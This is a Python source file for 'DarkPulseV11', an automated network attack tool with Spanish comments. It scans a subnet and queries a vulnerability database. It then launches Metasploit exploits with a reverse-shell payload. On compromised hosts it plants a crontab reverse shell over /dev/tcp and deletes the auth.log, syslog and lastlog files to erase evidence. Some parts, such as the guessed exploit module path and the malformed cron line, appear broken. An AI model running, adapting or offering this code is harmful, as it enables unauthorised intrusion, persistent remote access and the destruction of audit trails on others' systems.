# DarkPulseV1_fixed.py
import requests
import nmap
import json
import socket
import subprocess
import time
import threading
import logging
from datetime import datetime
# Import defensivo: si no tienes metasploit RPC instalado, el script no fallará al importar.
try:
    from metasploit import MsfRpcClient
    _HAS_MSFRPC = True
except Exception:
    MsfRpcClient = None
    _HAS_MSFRPC = False

from concurrent.futures import ThreadPoolExecutor

class DarkPulseV11:
    def __init__(self, rango_ip, metasploit_pass="tu_contraseña", max_threads=10):
        self.rango_ip = rango_ip
        self.metasploit_pass = metasploit_pass
        self.max_threads = max_threads
        self.nm = nmap.PortScanner()
        self.vulnerabilidades_encontradas = []
        self.dispositivos_vulnerables = []
        self.reporte = {"timestamp": str(datetime.now()), "resultados": []}
        self.logger = self._configurar_logger()

    def _configurar_logger(self):
        logging.basicConfig(
            filename="darkpulse_v11.log",
            level=logging.INFO,
            format="%(asctime)s - %(levelname)s - %(message)s"
        )
        return logging.getLogger("DarkPulseV11")

    def escanear_red(self):
        self.logger.info(f"Escaneando red: {self.rango_ip}")
        print(f"[*] Escaneando red: {self.rango_ip}")
        try:
            # ping scan para detectar hosts activos
            self.nm.scan(hosts=self.rango_ip, arguments="-sn --min-rate 1000")
        except Exception as e:
            self.logger.error(f"Error ejecutando nmap: {e}")
            print(f"[-] Error ejecutando nmap: {e}")
            return []

        dispositivos = []
        for host in self.nm.all_hosts():
            try:
                estado = self.nm[host].get("status", {}).get("state", "")
                # método alternativo si la API difiere
                if not estado:
                    try:
                        if self.nm[host].state() == "up":
                            estado = "up"
                    except Exception:
                        pass
                if estado == "up":
                    dispositivos.append(host)
                    print(f"[+] Dispositivo encontrado: {host}")
                    self.logger.info(f"Dispositivo encontrado: {host}")
            except Exception:
                # si la estructura es inesperada, aún añadimos el host
                dispositivos.append(host)
        return dispositivos

    def detectar_firewall(self, ip, timeout=30):
        try:
            resultado = subprocess.run(["nmap", "-sA", ip], capture_output=True, text=True, timeout=timeout)
            salida = (resultado.stdout or "") + (resultado.stderr or "")
            if "filtered" in salida.lower():
                print(f"[!] Firewall detectado en {ip}")
                self.logger.warning(f"Firewall detectado en {ip}")
                return True
            return False
        except subprocess.TimeoutExpired:
            print(f"[-] Timeout detectando firewall en {ip}")
            self.logger.error(f"Timeout detectando firewall en {ip}")
            return False
        except Exception as e:
            print(f"[-] Error detectando firewall en {ip}: {e}")
            self.logger.error(f"Error detectando firewall en {ip}: {e}")
            return False

    def analizar_dispositivo(self, ip):
        print(f"[*] Analizando dispositivo: {ip}")
        self.logger.info(f"Analizando dispositivo: {ip}")
        try:
            # Escaneo no excesivamente intrusivo; puede requerir privilegios para -O
            self.nm.scan(ip, arguments="-O -sV --osscan-guess --version-intensity 9")
            hostinfo = self.nm[ip]

            # SO (verificar existencia)
            osmatches = hostinfo.get("osmatch", []) if isinstance(hostinfo, dict) else []
            so = osmatches[0]["name"] if osmatches else "Desconocido"

            # Puertos y servicios — comprobar la sección "tcp"
            puertos = []
            servicios = {}
            if isinstance(hostinfo, dict) and "tcp" in hostinfo:
                try:
                    puertos = sorted(int(p) for p in hostinfo["tcp"].keys())
                    servicios = {int(p): hostinfo["tcp"][p].get("name", "") for p in hostinfo["tcp"].keys()}
                except Exception:
                    # Fallback si la estructura es distinta
                    puertos = []
                    servicios = {}

            info = {
                "ip": ip,
                "os": so,
                "puertos": puertos,
                "servicios": servicios,
                "firewall": self.detectar_firewall(ip)
            }
            print(f"[+] IP: {ip}, SO: {info['os']}, Puertos: {info['puertos']}, Servicios: {info['servicios']}, Firewall: {info['firewall']}")
            self.reporte["resultados"].append(info)
            self.logger.info(f"Análisis completado: {info}")
            return info
        except Exception as e:
            print(f"[-] Error analizando {ip}: {e}")
            self.logger.error(f"Error analizando {ip}: {e}")
            return None
    def buscar_vulnerabilidades(self, sistema_operativo, puerto, servicio):
        print(f"[*] Buscando vulnerabilidades para {sistema_operativo} en puerto {puerto} ({servicio})")
        self.logger.info(f"Buscando vulnerabilidades para {sistema_operativo} en puerto {puerto} ({servicio})")
        url = f"https://vulners.com/api/v3/search/lucene/?query={sistema_operativo} port:{puerto} {servicio}"
        try:
            headers = {"User-Agent":"DarkPulse/1.1"}
            respuesta = requests.get(url, headers=headers, timeout=15)
            if respuesta.status_code == 200:
                vulnerabilidades = respuesta.json()["data"]["search"]
                for vuln in vulnerabilidades:
                    if float(vuln["cvss"]["score"]) >= 7.0:
                        vuln_info = {
                        "id": vuln["id"],
                        "title": vuln["title"],
                        "score": vuln["cvss"]["score"],
                        "ip": sistema_operativo,"puerto": puerto
}                        
                        self.vulnerabilidades_encontradas.append(vuln_info)
                        print(f"[!] Vulnerabilidad crítica: {vuln['id']} - {vuln['title']} (CVSS: {vuln['cvss']['score']})")
                        self.logger.info(f"Vulnerabilidad encontrada: {vuln['id']} - {vuln['title']}")
                return vulnerabilidades
            return []
        except Exception as e:
            print(f"[-] Error buscando vulnerabilidades: {e}")
            self.logger.error(f"Error buscando vulnerabilidades: {e}")
            return []
    def explotar_vulnerabilidad(self, ip, puerto, vulnerabilidad_id):
        print(f"[*] Intentando explotar {vulnerabilidad_id} en {ip}:{puerto}")
        self.logger.info(f"Intentando explotar {vulnerabilidad_id} en {ip}:{puerto}")
        try:
            client = MsfRpcClient(self.metasploit_pass)
            exploit = client.modules.use("exploit", f"unix/webapp/cve_{vulnerabilidad_id.lower().replace('-', '_')}")
            exploit["RHOSTS"] = ip
            exploit["RPORT"] = puerto
            payload = client.modules.use("payload","cmd/unix/reverse_python")
            payload["LHOST"] = socket.gethostbyname(socket.gethostname())
            payload["LPORT"] = 4444
            resultado = exploit.execute(payload=payload)
            if resultado.get("job_id"):
                print(f"[!] ¡Éxito! Acceso total en {ip}:{puerto}")
                self.logger.info(f"Éxito en explotación: {ip}:{puerto}")
                self.dispositivos_vulnerables.append(ip)
                self.establecer_persistencia(ip)
                return True
            else:
                print(f"[-] Fallo en la explotación de {ip}:{puerto}")
                self.logger.warning(f"Fallo en explotación: {ip}:{puerto}")
                return False
        except Exception as e:
            print(f"[-] Error en explotación: {e}")
            self.logger.error(f"Error en explotación: {e}")
            return False

    def establecer_persistencia(self, ip):
        print(f"[*] Estableciendo persistencia en {ip}")
        self.logger.info(f"Estableciendo persistencia en {ip}")
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            comando = f"echo '*/5**** /bin/bash -i >& /dev/tcp/{local_ip}/4444 0>&1' | crontab -"
            subprocess.run(f"ssh {ip} \"{comando}\"", shell=True, capture_output=True, timeout=10)
            print(f"[!] Persistencia establecida en {ip}")
            self.logger.info(f"Persistencia establecida en {ip}")
        except Exception as e:
            print(f"[-] Error al establecer persistencia: {e}")
            self.logger.error(f"Error al establecer persistencia: {e}")

    def limpiar_huellas(self, ip):
        print(f"[*] Limpiando huellas en {ip}")
        self.logger.info(f"Limpiando huellas en {ip}")
        try:
            comandos = [
                f"ssh {ip} 'rm -f /var/log/auth.log'",
                f"ssh {ip} 'rm -f /var/log/syslog'",
                f"ssh {ip} 'echo > /var/log/lastlog'"
            ]
            for cmd in comandos:
                subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
            print(f"[!] Huellas limpiadas en {ip}")
            self.logger.info(f"Huellas limpiadas en {ip}")
        except Exception as e:
            print(f"[-] Error limpiando huellas: {e}")
            self.logger.error(f"Error limpiando huellas: {e}")

    def generar_reporte(self):
        try:
            with open("darkpulse_v11_reporte.json", "w", encoding="utf-8") as f:
                json.dump(self.reporte, f, indent=4, ensure_ascii=False)
            print("[+] Reporte generado: darkpulse_v11_reporte.json")
            self.logger.info("Reporte generado: darkpulse_v11_reporte.json")
        except Exception as e:
            print(f"[-] Error escribiendo reporte: {e}")
            self.logger.error(f"Error escribiendo reporte: {e}")

    def explotar_paralelo(self, ip, info):
        if info and info["puertos"]:
            for puerto in info["puertos"]:
                servicio = info["servicios"].get(puerto,"desconocido")
                vulnerabilidades = self.buscar_vulnerabilidades(info["os"], puerto, servicio)
                for vuln in vulnerabilidades:
                    if float(vuln["cvss"]["score"]) >= 7.0:
                        if self.explotar_vulnerabilidad(ip, puerto, vuln["id"]):
                            self.limpiar_huellas(ip)

    def ejecutar(self):
        banner = r"""
  __                     __  
____/ /_  ___  ____  _   __/ /_  ___  __  
/ __  / / / / |/_/ / / | / / __ \/ _ \/ / /
/ /_/ / /_/ />  </ / /| |/ / /_/ /  __/ /_/ 
\__,_/\__,_/_/\_\/_/_/ |_/ /_.___/\___/\__, /
                                   /____/
      ⚡️ DarkPulseV11: Escáner de Red ⚡️
      🔓 Buscando vulnerabilidades... 🔍
            Por: SpiritNetGhost
"""
        print(banner)

        start_time = time.time()
        dispositivos = self.escanear_red()
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for ip in dispositivos:
                info = self.analizar_dispositivo(ip)
                if info:
                    futures.append(executor.submit(self.explotar_paralelo, ip, info))
            for future in futures:
                future.result()
        self.generar_reporte()
        print(f"[!] Operación completada en {time.time() - start_time:.2f} segundos. Dispositivos comprometidos: {self.dispositivos_vulnerables}")
        self.logger.info(f"Operación completada. Dispositivos comprometidos: {self.dispositivos_vulnerables}")
if __name__ == "__main__":
    darkpulse = DarkPulseV11(rango_ip="192.168.1.168/24", metasploit_pass="tu_contraseña", max_threads=10)
    darkpulse.ejecutar()
